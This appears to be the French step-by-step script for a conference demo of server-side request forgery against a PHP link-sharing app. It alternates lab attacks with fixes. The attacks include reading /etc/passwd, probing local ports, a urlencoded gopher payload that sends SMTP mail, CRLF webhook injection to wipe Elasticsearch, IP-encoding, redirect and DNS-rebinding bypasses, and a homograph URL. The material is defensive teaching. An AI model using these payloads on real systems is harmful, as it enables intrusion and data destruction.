Démos Forum PHP 2018
--------------------

## Machine virtuelle

Machine site: demo-forum-php 192.168.33.10
Machine attaque: demo-forum-php-attacker 192.168.33.11


### Elasticsearch
Si arreté: `sudo systemctl start elasticsearch.service`
Tourne sur le port 9200, n'écoute que la boucle locale

Recréer l'index: `php bin/console elastic:create-index`

L'index s'appelle `forumphp`.

Vider l'index: `curl -XPOST -H "Content-type: application/json" http://127.0.0.1:9200/forumphp/links/_delete_by_query -d '{ "query": { "match_all": {} } }'`

### Builder les assets
`yarn encore dev --watch`

## Préparation présentation

Penser à utiliser les bureaux virtuels.
Placer la prés sur un bureau virtuel et le navigateur sur l'autre.
Navigation avec ctrl + alt + flèche gauche / droite.


- VM Principale

    cd ~/Workspace/demo-forum-php && vagrant up && vagrant ssh
    sudo apache2ctl restart
    // Checker elasticsearch

- VM Attaquant

    cd ~/Workspace/demo-forum-php-attacker && vagrant up && vagrant ssh
    sudo apache2ctl restart

- Tunnel ngrok sur vm attaquante:

    cd ~/Workspace/demo-forum-php-attacker && vagrant share

Basculer PHPStorm en thème "IntelliJ" avant la présentation.
Basculer le terminal sur "Tango clair" ou "Noir sur blanc"


Vérifier qu'il n'y a pas de webhook enregistré

### Liens à mettre initialement dans le elasticsearch

https://www.journaldunet.com/web-tech/developpeur/1164498-php-forum-2015-interview-maxime-teneur-afup/
https://www.journaldunet.com/web-tech/developpeur/1197434-le-forum-php-2017-fera-la-part-belle-aux-retours-d-experience/
https://www.journaldunet.com/web-tech/developpeur/1164624-interview-de-fabien-potencier-sensiolabs/
https://www.journaldunet.com/web-tech/developpeur/1184729-interview-php-forum-2016/


## Etapes démo

### Démo initiale

1. Montrer la [liste des liens](http://demo-forum-php/links)
2. Accéder à la [page d'ajout de lien](http://demo-forum-php/links/add)
3. Ajouter un lien légitime. Par exemple https://www.journaldunet.com/web-tech/developpeur/1417308-geoffrey-bachelet-afup/
4. Voir le nouveau lien ajouté sur la liste des liens

### Premier lien incorrect

1. Depuis la [page d'ajout de lien](http://demo-forum-php/links/add)
2. Envoyer l'url http://trucbidulechouette.com
3. Montrer l'erreur. Le message curl est affiché uniquement pour les raisons de la démo.

A partir de cette étape on commence à forger des liens qui vont renvoyer
 des erreurs pour tester différents comportements.

### Voir les appels effectués à l'extérieur

1. Se connecter à la machine d'attaque: `cd ~/Workspace/demo-forum-php-attacker && vagrant ssh`
2. Faire défiler les logs apache: `sudo su - && tail -f /var/log/apache2/*.log`

### Lire des fichiers de la machine

1. Curl vers /etc/passwd: `file:///etc/passwd`
Voir dans le débug le dump du fichier

### Reconnaissance de services exposant du http

1. Curl vers le port apache http://127.0.0.1:80
2. Curl vers un port inconnu http://127.0.0.1:65356
3. Curl vers le port de consul http://127.0.0.1:8500
4. Curl vers le port elasticsearch http://127.0.0.1:9200

Bingo => on a du elasticsearch qui tourne, pas de consul.

### Exploitation de services Telnet
Gopher, concurrent de HTTP, plus utilisé mais toujours supporté par curl.

1. Envoi d'un mail

Version explicite du message: sendmail.txt

    HELO localhost
    MAIL FROM:<xavier@ccmbenchmark.com>
    RCPT TO:<xavier.leune@gmail.com>
    DATA
    From: [Hacker] <xavier@ccmbenchmark.com>
    To: <xavier.leune@gmail.com>
    Date: Tue, 15 Sep 2017 17:20:26 -0400
    Subject: Ah Ah AH

    Démo FORUM PHP


    .
    QUIT

Version urlencode (attention utiliser rawurlencode):
    HELO%20localhost%0AMAIL%20FROM%3A%3Cxavier%40ccmbenchmark.com%3E%0ARCPT%20TO%3A%3Cxavier.leune%40gmail.com%3E%0ADATA%0AFrom%3A%20%5BHacker%5D%20%3Cxavier%40ccmbenchmark.com%3E%0ATo%3A%20%3Cxavier.leune%40gmail.com%3E%0ADate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%0ASubject%3A%20Ah%20Ah%20AH%0A%0AD%C3%A9mo%20FORUM%20PHP%0A%0A%0A.%0AQUIT%0A

Avec le protocole:
    gopher://127.0.0.1:25/xHELO%20localhost%0AMAIL%20FROM%3A%3Cxavier%40ccmbenchmark.com%3E%0ARCPT%20TO%3A%3Cxavier.leune%40gmail.com%3E%0ADATA%0AFrom%3A%20%5BHacker%5D%20%3Cxavier%40ccmbenchmark.com%3E%0ATo%3A%20%3Cxavier.leune%40gmail.com%3E%0ADate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%0ASubject%3A%20Ah%20Ah%20AH%0A%0AD%C3%A9mo%20FORUM%20PHP%0A%0A%0A.%0AQUIT%0A

### Exploitation d'injection CRLF dans les headers CURL

Démonstration générale:

1. Démarrer un serveur netcat sur le port 9002: `nc -l 9002`
2. Ajouter un webhook avec token basique qui pointe vers 127.0.0.1:9002
3. Ajouter un nouveau lien et regarder la sortie sur netcat
4. Supprimer le premier webhook, enregistrer le nouveau token grace à la
sortie de la commande `vagrant@victim:/var/www/demo$ php create-webhook-injection.php http://127.0.0.1:9200/forumphp/_delete_by_query send-to-webhook.txt`
5. Constater le nouveau webhook injecté
6. Ajouter un nouveau lien. Tout semble ok sur la page de destination.
7. Raffraichir la page: Les liens ont disparu.
8. Aller voir la console de sortie de sf sur le post pour vérifier sortie.


### Première sécurisation

1. Ajout d'une vérification sur le scheme: on autorise uniquement http ou https. CF UrlCrawler2
2. On voit qu'on ne peut plus envoyer de mail à l'aide du protocole gopher ni lire de fichier

### Seconde sécurisation

1. On ajoute une vérification sur le domaine: on vérifie qu'il ne s'agit
pas d'une ip locale

Exemple d'écritures de cette ip: 10.1.1.1

* 266.257.257.257
* 167837953
* 4462805249
* 0xa.0x1.0x1.0x1
* 0x0a010101
* [::0a01:0101]

Nouvel essai d'accès à une url locale.

### Premier bypass: redirection

Redirection: http://demo-forum-php-attacker.com/redirection.php
Pointe vers http://127.0.0.1:9200

### Nouvelle sécurisation

1. On désactive le follow redirect, on traite le retour curl pour
vérifier si c'est une redirection, appliquer nos tests & envoyer la nvlle req

### Second bypass

On passe par un domaine xip.io.

1. Erreur sur un port qui apparaissait fermé: http://127.0.0.1.xip.io:8500
2. Erreur différente sur un port qui apparaissait ouvert: http://127.0.0.1.xip.io:9200

==> Le bypass semble fonctionner

### Nouvelle sécurisation domaine local

1. On va vérifier que la résolution n'envoie pas sur un domaine local,
à chaque itération on refait toutes les vérifications


### 3ème bypass

1. On passe par un service de dns rebinding

### Affichage d'une url trompeuse avec un domaine IDN
http://www.linternautе.com/homography.html ==> http://www.xn--linternaut-tsi.com/


### Decompression bomb



## Biblio
https://2017.zeronights.org/wp-content/uploads/materials/ZN17_Karbutov_CRLF_PDF.pdf
https://conference.hitb.org/hitbsecconf2017ams/materials/D2T2%20-%20Yu%20Hong%20-%20Attack%20Surface%20Extended%20by%20URL%20Schemes.pdf
http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html
https://www.dailysecurity.fr/server-side-request-forgery/
https://github.com/brannondorsey/whonow
